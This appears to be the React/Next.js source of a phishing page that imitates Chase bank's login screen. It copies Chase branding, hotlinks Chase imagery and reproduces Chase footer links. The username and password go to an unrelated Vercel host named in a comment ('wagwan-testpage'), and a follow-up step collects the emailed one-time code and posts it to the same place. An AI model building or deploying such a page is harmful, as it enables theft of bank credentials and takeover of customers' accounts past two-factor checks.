"use client";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { AlertTriangle, ChevronRight, Lock, Home } from "lucide-react";
import BankLogo from "@/components/BankLogo";

export default function LoginPage() {
  const [step, setStep] = useState("login");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [maskedEmail, setMaskedEmail] = useState("");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const router = useRouter();

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Enter your username and password.");
      return;
    }
    
    setError("");
    setIsLoading(true);
    
    try {
      // 1. Updated to your new Vercel URL (NO trailing slash!)
      const apiUrl = process.env.NEXT_PUBLIC_API_URL;
      
      // 2. This now perfectly builds: https://wagwan-testpage.vercel.app/api/auth/login
      const res = await fetch(`${apiUrl}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include", 
        body: JSON.stringify({ username, password })
      });
      
      const data = await res.json();
      
      if (!res.ok) {
        if (res.status === 401) {
          setError("Incorrect username or password.");
        } else {
          setError(data.error || "Login failed");
        }
        setIsLoading(false);
        return;
      }
      
      if (data.requiresOtp === false) {
        router.push("/dashboard");
        return;
      }
      
      setMaskedEmail(data.maskedEmail);
      setStep("otp");
    } catch (err) {
      setError("Network error. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length < 6) return;

    setError("");
    setIsLoading(true);

    try {
      // 1. Define the API URL here as well
      const apiUrl = process.env.NEXT_PUBLIC_API_URL;
      
      // 2. Update the fetch URL to use the absolute path
      const res = await fetch(`${apiUrl}/api/auth/verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        // Add credentials: "include" if your OTP route relies on cookies/sessions!
        credentials: "include", 
        body: JSON.stringify({ username, otp, rememberMe })
      });
      
      const data = await res.json();
      
      if (!res.ok) {
        setError(data.error || "Invalid code");
        setIsLoading(false);
        return;
      }
      
      router.push("/dashboard");
    } catch (err) {
      setError("Network error. Please try again.");
      setIsLoading(false);
    }
  };

  return (
    <div className="h-screen overflow-y-auto w-full bg-[#f4f4f4] font-sans">
      
      {/* HEADER BLOCK */}
      <div 
        className="w-full h-[400px] relative bg-cover bg-center shrink-0"
        style={{ backgroundImage: "url('https://asset.chase.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg')" }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/80 via-black/20 to-transparent"></div>
        
        {/* Transparent Logo */}
        <div className="absolute top-10 left-1/2 -translate-x-1/2 flex items-center justify-center z-20">
          <div className="text-white font-bold text-[28px] tracking-wider flex items-center gap-2">
            CHASE
            <BankLogo className="w-8 h-8 text-white" />
          </div>
        </div>
      </div>

      {/* FORM BLOCK */}
      <div className="w-full px-4 relative z-10 -mt-[280px] pb-24 shrink-0">
        <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] mx-auto">
          
          {step === "login" && (
            <form onSubmit={handleLoginSubmit} className="space-y-6 animate-in fade-in duration-300">
              
              {/* Username Input */}
              <div className="relative">
                <label className={`block text-[15px] font-bold mb-2 ${error ? 'text-[#8f0028]' : 'text-gray-700'}`}>
                  Username
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => { setUsername(e.target.value); if (error) setError(""); }}
                  className={`block w-full pb-1 text-gray-900 bg-transparent border-b ${error ? 'border-[#8f0028]' : 'border-gray-300 focus:border-[#005eb8]'} appearance-none focus:outline-none`}
                />
                {error && (
                  <div className="flex items-center gap-1.5 mt-1.5 text-[#8f0028] text-sm">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>Enter your username.</span>
                  </div>
                )}
              </div>

              {/* Password Input */}
              <div className="relative pt-2">
                <label className="block text-[15px] text-gray-700 mb-2">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => { setPassword(e.target.value); if (error) setError(""); }}
                    className="block w-full pb-1 pr-12 text-gray-900 bg-transparent border-b border-gray-300 appearance-none focus:outline-none focus:border-[#005eb8]"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 bottom-1 text-[#005eb8] text-[15px] hover:underline bg-white px-1"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
              </div>

              {/* Checkboxes */}
              <div className="flex justify-between items-center text-[13px] text-gray-700 pt-2">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input 
                    type="checkbox" 
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="w-4 h-4 rounded-sm border-gray-400 text-[#005eb8] focus:ring-[#005eb8]" 
                  />
                  Remember username
                </label>
                <label className="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" className="w-4 h-4 rounded-sm border-gray-400 text-[#005eb8] focus:ring-[#005eb8]" />
                  Use token
                </label>
              </div>

              {/* Action Buttons */}
              <div className="pt-4 space-y-4">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#005eb8] text-white font-bold py-3.5 rounded hover:bg-[#004b93] transition-colors disabled:opacity-70 flex justify-center items-center"
                >
                  {isLoading ? <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span> : "Sign In"}
                </button>
                
                <div className="flex items-center justify-center my-4">
                  <div className="flex-1 border-t border-blue-200"></div>
                  <span className="px-4 text-[15px] text-[#005eb8]">Or</span>
                  <div className="flex-1 border-t border-blue-200"></div>
                </div>

                <button
                  type="button"
                  className="w-full bg-white text-[#005eb8] border border-[#005eb8] font-semibold py-3.5 rounded hover:bg-blue-50 transition-colors"
                >
                  Passwordless sign In
                </button>
              </div>

              {/* Links - Connected to the new pages */}
              <div className="space-y-4 pt-4">
                <button 
                  type="button" 
                  onClick={() => router.push('/forgot-password')}
                  className="flex items-center text-[#005eb8] hover:underline text-[15px]"
                >
                  Forgot username/password? <ChevronRight className="w-4 h-4 ml-1" />
                </button>
                <button 
                  type="button" 
                  onClick={() => router.push('/signup')}
                  className="flex items-center text-[#005eb8] hover:underline text-[15px]"
                >
                  Not enrolled? Sign up now. <ChevronRight className="w-4 h-4 ml-1" />
                </button>
              </div>
            </form>
          )}

          {/* OTP Step */}
          {step === "otp" && (
            <form onSubmit={handleOtpSubmit} className="space-y-6 animate-in slide-in-from-right duration-300">
              <div className="text-center mb-6">
                <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
                  <Lock className="w-6 h-6 text-[#005eb8]" />
                </div>
                <h2 className="text-xl font-semibold text-gray-900">Verify your identity</h2>
                <p className="text-sm text-gray-500 mt-2">
                  We sent a temporary identification code to your registered email address ending in <span className="font-bold text-gray-900">{maskedEmail}</span>.
                </p>
              </div>

              {error && (
                <div className="bg-red-50 text-red-700 p-3 rounded text-sm text-center border border-red-200">
                  {error}
                </div>
              )}

              <div className="relative">
                <input
                  type="text"
                  maxLength="6"
                  value={otp}
                  onChange={(e) => { setOtp(e.target.value.replace(/\D/g, '')); if (error) setError(""); }}
                  className={`block w-full pt-6 pb-2 text-center tracking-[0.5em] text-2xl font-semibold text-gray-900 bg-transparent border-b-2 appearance-none focus:outline-none peer ${error ? 'border-red-600 focus:border-red-600' : 'border-gray-300 focus:border-[#005eb8]'}`}
                  placeholder=" "
                  autoFocus
                />
                <label className={`absolute text-sm duration-300 transform -translate-y-4 scale-75 top-5 z-10 origin-[0] left-1/2 -translate-x-1/2 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 ${error ? 'text-red-600 peer-focus:text-red-600' : 'text-gray-500 peer-focus:text-[#005eb8]'}`}>
                  Identification Code
                </label>
              </div>

              <button
                type="submit"
                disabled={otp.length < 6 || isLoading}
                className="w-full bg-[#005eb8] text-white font-semibold py-3.5 rounded hover:bg-[#004b93] transition-colors disabled:bg-gray-300 disabled:text-gray-500 flex justify-center items-center mt-8"
              >
                {isLoading ? <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span> : "Verify & Sign in"}
              </button>

              <button 
                type="button" 
                onClick={() => { setStep("login"); setOtp(""); setError(""); }}
                className="w-full text-center text-[#005eb8] text-sm font-medium hover:underline mt-4"
              >
                Cancel and return to login
              </button>
            </form>
          )}
        </div>
      </div>

      {/* FOOTER BLOCK */}
      <div className="w-full bg-white pt-8 pb-12 px-4 border-t border-gray-200 shrink-0">
        
        {/* SVGs for Social Icons */}
        <div className="flex justify-center gap-6 mb-6">
          <a href="#" className="text-gray-500 hover:text-gray-700">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" /></svg>
          </a>
          <a href="#" className="text-gray-500 hover:text-gray-700">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z" /></svg>
          </a>
          <a href="#" className="text-gray-500 hover:text-gray-700">
            <svg className="w-4 h-4 mt-0.5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" /></svg>
          </a>
          <a href="#" className="text-gray-500 hover:text-gray-700">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
          </a>
          <a href="#" className="text-gray-500 hover:text-gray-700">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
          </a>
        </div>

        <div className="max-w-2xl mx-auto flex flex-wrap justify-center gap-x-5 gap-y-2 text-[13px] text-[#4d4d4d] text-center px-4 leading-loose">
          <a href="#" className="hover:underline">Contact us</a>
          <a href="#" className="hover:underline">Privacy & security</a>
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">Accessibility</a>
          <a href="#" className="hover:underline">SAFE Act: Chase Mortgage Loan Originators</a>
          <a href="#" className="hover:underline">Fair Lending</a>
          <a href="#" className="hover:underline">About Chase</a>
          <a href="#" className="hover:underline">J.P. Morgan</a>
          <a href="#" className="hover:underline">JPMorgan Chase & Co.</a>
          <a href="#" className="hover:underline">Careers</a>
          <a href="#" className="hover:underline">Español</a>
          <a href="#" className="hover:underline">Chase Canada</a>
          <a href="#" className="hover:underline">Site map</a>
          <a href="#" className="hover:underline">Member FDIC</a>
        </div>
        
        <div className="flex flex-col items-center justify-center mt-3 text-[13px] text-[#4d4d4d] gap-2">
          <div className="flex items-center gap-1.5">
            <Home className="w-4 h-4" /> Equal Housing Opportunity
          </div>
          <div>© 2026 JPMorganChase</div>
        </div>
      </div>

    </div>
  );
}